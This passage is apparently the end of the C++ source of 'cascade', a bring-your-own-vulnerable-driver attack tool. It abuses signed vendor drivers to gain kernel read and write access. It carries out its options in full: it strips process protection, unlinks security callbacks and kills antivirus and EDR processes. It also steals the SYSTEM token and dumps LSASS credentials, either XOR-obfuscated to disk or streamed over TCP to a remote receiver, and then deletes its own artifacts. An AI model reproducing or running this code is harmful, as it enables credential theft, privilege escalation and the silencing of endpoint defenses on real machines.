        if (!RtsPpx_PhysRead(0xF0000, probe, 8)) {
            printf("[-] Probe failed - driver may not work\n");
            // Try a higher address that might be valid
            printf("[*] Trying physical 0xFED00000 (HPET region)...\n");
            if (!RtsPpx_PhysRead(0xFED00000, probe, 8)) {
                printf("[-] Second probe also failed\n");
                return false;
            }
        }
        printf("[+] Probe OK: %02X %02X %02X %02X %02X %02X %02X %02X\n",
            probe[0], probe[1], probe[2], probe[3], probe[4], probe[5], probe[6], probe[7]);

        printf("[*] Bootstrapping CR3 via PML4 self-ref scan (may take a moment)...\n");
        g_rtsPpxCr3 = RtsPpx_FindCr3();
        if (!g_rtsPpxCr3) {
            printf("[-] CR3 bootstrap failed - RtsPpx VA->PA unavailable\n"); return false;
        }
        printf("[+] Kernel CR3: 0x%llX\n", g_rtsPpxCr3);
        return true;
    }

    if (cfg.type == ProviderType::RwDrv) {
        g_rwDrvDev = CreateFileW(L"\\\\.\\fmem3",
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (g_rwDrvDev == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open \\\\.\\fmem3 (%lu)\n", GetLastError());
            return false;
        }
        printf("[+] RwDrv device opened (handle=0x%p)\n", g_rwDrvDev);

        printf("[*] Probing phys read at 0x1000...\n");
        BYTE probe[8]{};
        if (!RwDrv_PhysRead(0x1000, probe, 8)) {
            printf("[-] Probe failed - driver may not work\n");
            return false;
        }
        printf("[+] Probe OK: %02X %02X %02X %02X %02X %02X %02X %02X\n",
            probe[0], probe[1], probe[2], probe[3], probe[4], probe[5], probe[6], probe[7]);

        printf("[*] Bootstrapping CR3 via PML4 self-ref scan...\n");
        g_rwDrvCr3 = RwDrv_FindCr3();
        if (!g_rwDrvCr3) {
            printf("[-] CR3 bootstrap failed - RwDrv VA->PA unavailable\n"); return false;
        }
        printf("[+] Kernel CR3: 0x%llX\n", g_rwDrvCr3);
        return true;
    }

    std::wstring devPath = L"\\\\.\\" + g_svcName;
    g_biostoolDev = CreateFileW(devPath.c_str(),
        GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
        devPath = L"\\\\.\\BiosToolCommonDriver";
        g_biostoolDev = CreateFileW(devPath.c_str(),
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    }
    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
        devPath = L"\\\\.\\ASUSBIOSIO";
        g_biostoolDev = CreateFileW(devPath.c_str(),
            GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    }
    if (g_biostoolDev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device (tried svc, BiosToolCommonDriver, ASUSBIOSIO) (%lu)\n", GetLastError());
        return false;
    }
    printf("[+] Device opened: %s\n", WideToUtf8(devPath).c_str());
    return true;
}

static void CleanupProvider() {
    if (g_biostoolDev != INVALID_HANDLE_VALUE) { CloseHandle(g_biostoolDev); g_biostoolDev = INVALID_HANDLE_VALUE; }
    if (g_pdfwDev     != INVALID_HANDLE_VALUE) { CloseHandle(g_pdfwDev);     g_pdfwDev     = INVALID_HANDLE_VALUE; }
    if (g_ktapiDev    != INVALID_HANDLE_VALUE) { CloseHandle(g_ktapiDev);    g_ktapiDev    = INVALID_HANDLE_VALUE; }
    if (g_iocDev      != INVALID_HANDLE_VALUE) { CloseHandle(g_iocDev);      g_iocDev      = INVALID_HANDLE_VALUE; }
    if (g_asio3Dev    != INVALID_HANDLE_VALUE) { CloseHandle(g_asio3Dev);    g_asio3Dev    = INVALID_HANDLE_VALUE; }
    if (g_ntiolibDev  != INVALID_HANDLE_VALUE) { CloseHandle(g_ntiolibDev);  g_ntiolibDev  = INVALID_HANDLE_VALUE; }
    if (g_rtsPpxDev   != INVALID_HANDLE_VALUE) { CloseHandle(g_rtsPpxDev);   g_rtsPpxDev   = INVALID_HANDLE_VALUE; }
    if (g_rwDrvDev    != INVALID_HANDLE_VALUE) { CloseHandle(g_rwDrvDev);    g_rwDrvDev    = INVALID_HANDLE_VALUE; }
    if (g_swwlEvent) { CloseHandle(g_swwlEvent); g_swwlEvent = nullptr; }
    if (!g_regPath.empty()) { UnloadDriverViaNt(g_regPath); DeleteServiceKey(g_svcName); }
    if (!g_dropPath.empty()) { JitteredSleep(500); DeleteFileW(g_dropPath.c_str()); }
}

static void Usage(const char* prog) {
    printf(
        "cascade - consolidated BYOVD tool (BiosToolCommonDriver / ktapi / warp)\n\n"
        "usage: %s [options]\n"
        "  --driver PATH          path to vulnerable driver .sys\n"
        "  --driver-type TYPE     biostool (default), ktapi, pdfwkrnl, iocdrv, asio3, ntiolib, rtsppx\n"
        "  --pid N                target PID (default: lsass)\n\n"
        "Pre-flight checks:\n"
        "  --check-security       detect VBS/HVCI/Credential Guard and exit\n"
        "  --force-unsafe         proceed despite HVCI/CG warnings\n\n"
        "Recon (read-only):\n"
        "  --test-rw              verify kernel R/W works\n"
        "  --dry-run              resolve structures, write nothing\n"
        "  --list-callbacks       enumerate ObCallback registrations\n"
        "  --list-procs           enumerate processes from kernel EPROCESS chain\n\n"
        "PPL / token:\n"
        "  --ppl-strip --pid N    remove PPL from specific PID\n"
        "  --ppl-add   --pid N    add PPL (Protected/WinSystem) to PID\n"
        "  --priv-esc  [--pid N]  steal SYSTEM token (default: self)\n\n"
        "EDR kill:\n"
        "  --kill-edr             strip PPL + terminate all known AV/EDR (%d entries)\n"
        "  --kill-pid  --pid N    strip PPL + terminate specific PID\n\n"
        "Callbacks:\n"
        "  --patch-callbacks      unlink all ObCallback registrations\n\n"
        "Dump:\n"
        "  --dump-rpm  --out PATH    ReadProcessMemory dump (recommended)\n"
        "  --dump-tcp  RECV_IP PORT  disk-free TCP streaming dump\n"
        "  --dump-kernel --out PATH  CR3 physical read (no VM_READ handle)\n"
        "  --dump --out PATH         [deprecated: use --dump-rpm] MiniDumpWriteDump\n"
        "  --no-xor               raw output (with --dump)\n"
        "  --xor-key HEX          XOR key byte in hex (default: 55); applies to --dump and --decode\n"
        "  --decode --in P --out P  undo XOR, validate MDMP\n\n"
        "AsIO3 bypass:\n"
        "  --patch-driver PATH    secondary driver used to patch AsIO3 IRP_MJ_CREATE in kernel\n"
        "  --patch-driver-type T  iocdrv | asusbiosio | asmio | biostool (default: iocdrv)\n\n"
        "Cleanup:\n"
        "  --cleanup-only         force-unload driver and delete artifacts, then exit\n\n"
        "Common:\n"
        "  --verbose              show kernel addresses and extended debug output\n"
        "  --help\n",
        prog, []{ int n=0; for(const char**p=kEdrProcs;*p;p++) n++; return n; }());
}

int main(int argc, char** argv) {
    Config cfg;
    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto next = [&]() -> const char* { return (i + 1 < argc) ? argv[++i] : ""; };
        if (a == "--help" || a == "-h")         { Usage(argv[0]); return 0; }
        else if (a == "--driver")               cfg.drvPath    = next();
        else if (a == "--out")                  cfg.outPath    = next();
        else if (a == "--in")                   cfg.inPath     = next();
        else if (a == "--pid")                  cfg.targetPid  = (DWORD)atol(next());
        else if (a == "--driver-type") {
            std::string t = next();
            if (t == "biostool")               cfg.type = ProviderType::BiosTool;
            else if (t == "ktapi")             cfg.type = ProviderType::Ktapi;
            else if (t == "pdfwkrnl")          cfg.type = ProviderType::PdfwKrnl;
            else if (t == "iocdrv")            cfg.type = ProviderType::IocDrv;
            else if (t == "asio3")             cfg.type = ProviderType::AsIO3;
            else if (t == "ntiolib")           cfg.type = ProviderType::NTIOLib;
            else if (t == "rtsppx")            cfg.type = ProviderType::RtsPpx;
            else if (t == "rwdrv")             cfg.type = ProviderType::RwDrv;
            else { printf("[-] Unknown driver-type: %s\n", t.c_str()); return 2; }
        }
        else if (a == "--dry-run")              cfg.dryRun           = true;
        else if (a == "--test-rw")              cfg.testRw           = true;
        else if (a == "--priv-esc")             cfg.doPrivEsc        = true;
        else if (a == "--kill-edr")             cfg.killEdr          = true;
        else if (a == "--kill-pid")             cfg.doKillPid        = true;
        else if (a == "--ppl-strip")            cfg.doPplStrip       = true;
        else if (a == "--ppl-add")              cfg.doPplAdd         = true;
        else if (a == "--dump")                 cfg.doDump           = true;
        else if (a == "--dump-rpm")             cfg.doDumpRpm        = true;
        else if (a == "--dump-kernel")          cfg.doDumpKernel     = true;
        else if (a == "--dump-tcp") {
            cfg.doDumpTcp = true;
            cfg.recvIp    = next();
            cfg.recvPort  = atoi(next());
        }
        else if (a == "--patch-callbacks")      cfg.doPatchCallbacks = true;
        else if (a == "--list-callbacks")       cfg.doListCallbacks  = true;
        else if (a == "--list-procs")           cfg.doListProcs      = true;
        else if (a == "--decode")               cfg.doDecode         = true;
        else if (a == "--no-xor")               cfg.noXor            = true;
        else if (a == "--verbose")              cfg.verbose          = true;
        else if (a == "--check-security")       cfg.doCheckSecurity  = true;
        else if (a == "--cleanup-only")         cfg.doCleanupOnly    = true;
        else if (a == "--force-unsafe")         cfg.forceUnsafe      = true;
        else if (a == "--patch-driver")         cfg.patchDrvPath     = next();
        else if (a == "--patch-driver-type")    cfg.patchDrvType     = next();
        else if (a == "--xor-key") {

            const char* kstr = next();
            unsigned long kval = strtoul(kstr, nullptr, 16);
            cfg.xorKey = (BYTE)(kval & 0xFF);
        }
        else { printf("[-] Unknown arg: %s\n", a.c_str()); Usage(argv[0]); return 2; }
    }

    if (cfg.verbose) g_verbose = true;

    if (cfg.doCheckSecurity) {
        SecurityStatus sec = CheckSecurityFeatures();
        PrintSecurityStatus(sec);
        if (sec.hvciEnabled || sec.credGuardEnabled) {
            return 1;
        }
        return 0;
    }

    if (cfg.doDecode) {

        if (cfg.inPath.empty() || cfg.outPath.empty()) {
            printf("[-] --decode needs --in and --out\n"); return 2;
        }
        return DecodeFile(cfg.inPath.c_str(), cfg.outPath.c_str(), cfg.xorKey) ? 0 : 1;
    }

    DWORD build = GetWindowsBuild();
    printf("[*] Windows build: %lu\n", build);
    SetOffsetsByBuild(build);

    if (cfg.doCleanupOnly) {
        printf("[*] Cleanup-only mode: attempting to remove driver artifacts...\n");
        const wchar_t* svcNames[] = {
            L"BiosToolCommonDriver", L"ktapi", L"PdFwKrnl",
            L"BiosTool_", nullptr  // prefix for pid-based names
        };
        for (int i = 0; svcNames[i]; i++) {
            std::wstring svc = svcNames[i];
            std::wstring regPath = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + svc;
            UNICODE_STRING_W us{};
            us.Buffer = (LPWSTR)regPath.c_str();
            us.Length = (USHORT)(regPath.size() * sizeof(wchar_t));
            us.MaximumLength = us.Length + sizeof(wchar_t);
            NTSTATUS st = g_NtUnloadDriver(&us);
            if (NT_SUCCESS(st)) {
                printf("[+] Unloaded %ls\n", svc.c_str());
            }
            DeleteServiceKey(svc);
        }
        wchar_t tempDir[MAX_PATH]{};
        GetTempPathW(MAX_PATH, tempDir);
        WIN32_FIND_DATAW fd;
        std::wstring pattern = std::wstring(tempDir) + L"*.sys";
        HANDLE hFind = FindFirstFileW(pattern.c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::wstring path = std::wstring(tempDir) + fd.cFileName;
                if (DeleteFileW(path.c_str())) {
                    printf("[+] Deleted %ls\n", fd.cFileName);
                }
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
        printf("[*] Cleanup complete\n");
        return 0;
    }

    bool isDangerousOp = cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel ||
                         cfg.doDumpTcp || cfg.killEdr || cfg.doPatchCallbacks;
    if (isDangerousOp && !cfg.forceUnsafe) {
        SecurityStatus sec = CheckSecurityFeatures();
        if (sec.hvciEnabled) {
            printf("\n[!!!] HVCI is ACTIVE - kernel writes will likely BSOD the system.\n");
            printf("      Use --force-unsafe to proceed anyway, or disable HVCI first.\n\n");
            return 1;
        }
        if (sec.credGuardEnabled && (cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel || cfg.doDumpTcp)) {
            printf("\n[!!!] Credential Guard is ACTIVE - LSASS dump will be EMPTY.\n");
            printf("      Secrets are isolated in VBS; dumping is pointless.\n");
            printf("      Use --force-unsafe to proceed anyway.\n\n");
            return 1;
        }
        if (sec.driverBlocklistOn) {
            printf("[!] Driver blocklist enabled - vulnerable driver may fail to load.\n");
        }
    }

    if (!InitProvider(cfg)) return 1;


    KernelBase kb = GetKernelBase();
    if (!kb.ntosBase || !kb.systemEproc) {
        printf("[-] Failed to locate ntoskrnl base or System EPROCESS\n");
        CleanupProvider(); return 1;
    }
    if (g_verbose) {
        printf("[*] ntoskrnl: 0x%llX\n", kb.ntosBase);
        printf("[+] System EPROCESS: 0x%llX\n", kb.systemEproc);
    }

    int ret = 0;

    if (cfg.testRw) {
        if (!TestRw(kb.systemEproc)) ret = 1;
        CleanupProvider(); return ret;
    }

    if (cfg.doListCallbacks) {
        if (!ListCallbacks(kb.ntosBase)) ret = 1;
    }

    if (cfg.doListProcs) {
        ListProcs(kb.systemEproc);
    }

    DWORD pid = cfg.targetPid;
    if (!pid && (cfg.doDump || cfg.doDumpRpm || cfg.doDumpKernel ||
                 cfg.doDumpTcp || cfg.dryRun)) {
        pid = FindPidByName("lsass.exe");
        if (!pid) { printf("[-] Cannot find lsass.exe; use --pid\n"); CleanupProvider(); return 1; }
        printf("[*] LSASS PID: %lu\n", pid);
    }

    if (cfg.doPplStrip) {
        DWORD tpid = cfg.targetPid;
        if (!tpid) { printf("[-] --ppl-strip requires --pid\n"); CleanupProvider(); return 2; }
        PplResult r = StripPpl(kb.systemEproc, tpid, false);
        if (!r.ok) ret = 1;
    }

    if (cfg.doPplAdd) {
        DWORD tpid = cfg.targetPid;
        if (!tpid) { printf("[-] --ppl-add requires --pid\n"); CleanupProvider(); return 2; }
        if (!PplAdd(kb.systemEproc, tpid)) ret = 1;
    }

    if (cfg.killEdr) {
        printf("[*] Patching ObCallbacks before EDR kill...\n");
        PatchObCallbacks(kb.ntosBase);
        printf("[*] Stripping PPL from all running processes...\n");
        QWORD head  = kb.systemEproc + g_off.ActiveProcessLinks;
        QWORD flink = KReadQword(head);
        int stripped = 0;
        int guard = 0;
        while (flink && flink != head && guard++ < 10000) {
            QWORD ep = flink - g_off.ActiveProcessLinks;
            BYTE prot = 0;
            KRead(ep + g_off.Protection, &prot, 1);
            if (prot > 0) {
                char nm[16]{};
                KRead(ep + g_off.ImageFileName, nm, 15);
                BYTE zero = 0;
                if (KWrite(ep + g_off.Protection, &zero, 1)) {
                    BYTE verify = 0xFF; KRead(ep + g_off.Protection, &verify, 1);
                    printf("[+] PPL stripped: %-20s Protection 0x%02X -> 0x%02X\n", nm, prot, verify);
                    stripped++;
                }
            }
            flink = KReadQword(ep + g_off.ActiveProcessLinks);
        }
        printf("[*] %d PPL processes stripped\n", stripped);
        KillEdrs();
    }

    if (cfg.doKillPid) {
        DWORD tpid = cfg.targetPid;
        if (!tpid) { printf("[-] --kill-pid requires --pid\n"); CleanupProvider(); return 2; }
        if (!KillSpecificPid(kb.systemEproc, tpid)) ret = 1;
    }

    if (cfg.doPatchCallbacks) {
        printf("[*] Patching Defender ObCallback registrations...\n");
        if (!PatchObCallbacks(kb.ntosBase)) ret = 1;
    }

    if (cfg.doPrivEsc) {
        DWORD tpid = cfg.targetPid ? cfg.targetPid : GetCurrentProcessId();
        printf("[*] Stealing SYSTEM token for PID %lu%s\n",
               tpid, cfg.targetPid ? "" : " (self)");
        if (!TokenSteal(kb.systemEproc, tpid)) ret = 1;
    }

    if (cfg.dryRun) {
        if (!pid) { printf("[-] --dry-run requires target PID\n"); CleanupProvider(); return 2; }
        PplResult r = StripPpl(kb.systemEproc, pid, true);
        if (!r.ok) ret = 1;
        else printf("\n[dry-run] OK. Run with --dump-rpm --out <path> to execute.\n");
    }

    if (cfg.doDump) {
        if (cfg.outPath.empty()) { printf("[-] --dump needs --out\n"); CleanupProvider(); return 2; }
        printf("[*] Auto-patching ObCallbacks for dump...\n");
        PatchObCallbacks(kb.ntosBase);
        QWORD lsassEp = FindEprocessByPid(kb.systemEproc, pid, nullptr);
        BYTE savedProt = 0, savedSig = 0, savedSecSig = 0;
        if (lsassEp) {
            KRead(lsassEp + g_off.Protection - 2, &savedSig,    1);
            KRead(lsassEp + g_off.Protection - 1, &savedSecSig, 1);
            KRead(lsassEp + g_off.Protection,     &savedProt,   1);
        }
        PplResult r = StripPpl(kb.systemEproc, pid, false, true);
        if (!r.ok) { CleanupProvider(); return 1; }
        bool ok = DumpLsass(pid, cfg.outPath.c_str(), cfg.noXor, cfg.xorKey);
        if (lsassEp && savedProt) RestorePpl(lsassEp, savedProt, savedSig, savedSecSig);
        if (!ok) ret = 1;
    }

    if (cfg.doDumpRpm) {
        if (cfg.outPath.empty()) { printf("[-] --dump-rpm needs --out\n"); CleanupProvider(); return 2; }
        DWORD rpid = pid ? pid : FindPidByName("lsass.exe");
        if (!rpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
        printf("[*] Auto-patching ObCallbacks for RPM dump...\n");
        PatchObCallbacks(kb.ntosBase);
        if (!DumpRpm(rpid, cfg.outPath.c_str())) ret = 1;
    }

    if (cfg.doDumpTcp) {
        if (cfg.recvIp.empty()) { printf("[-] --dump-tcp needs RECV_IP PORT\n"); CleanupProvider(); return 2; }
        DWORD rpid = pid ? pid : FindPidByName("lsass.exe");
        if (!rpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
        printf("[*] Auto-patching ObCallbacks for TCP dump...\n");
        PatchObCallbacks(kb.ntosBase);
        if (!DumpRpmTcp(rpid, cfg.recvIp.c_str(), cfg.recvPort)) ret = 1;
    }

    if (cfg.doDumpKernel) {
        if (cfg.outPath.empty()) { printf("[-] --dump-kernel needs --out\n"); CleanupProvider(); return 2; }
        DWORD kpid = pid ? pid : FindPidByName("lsass.exe");
        if (!kpid) { printf("[-] Cannot find lsass.exe\n"); CleanupProvider(); return 1; }
        if (!DumpKernel(kb.systemEproc, kpid, cfg.outPath.c_str())) ret = 1;
    }

    CleanupProvider();
    return ret;
}
